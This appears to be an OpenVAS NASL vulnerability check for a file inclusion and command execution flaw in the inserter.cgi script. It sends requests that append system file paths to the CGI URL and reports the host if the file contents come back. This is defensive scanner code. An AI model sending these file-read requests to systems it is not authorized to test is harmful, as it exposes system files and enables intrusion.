# OpenVAS Vulnerability Test
# $Id: inserter_file_inclusion.nasl 13543 2019-02-08 14:43:51Z cfischer $
# Description: inserter.cgi File Inclusion and Command Execution Vulnerabilities
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# From: fireboy fireboy <fireboynet@webmails.com>
# remote command execution in inserter.cgi script
# 2005-04-25 07:19

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18149");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("inserter.cgi File Inclusion and Command Execution Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Delete this file");
  script_tag(name:"summary", value:"The remote web server contains the 'inserter' CGI.

 The inserter.cgi contains a vulnerability that allows remote attackers to cause
 the CGI to execute arbitrary commands with the privileges of the web server
 by supplying it with a piped instruction or to include arbitrary files by
 providing an absolute path to the location of the file.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"Mitigation");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

files = traversal_files();

foreach dir (make_list_unique("/", cgi_dirs(port:port))) {

  if( dir == "/" ) dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    req = http_get(item: dir + "/inserter.cgi?/" + file, port: port);
    r = http_keepalive_send_recv(port:port, data:req);
    if( r == NULL )exit(0);

    if(egrep(pattern:pattern, string:r)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);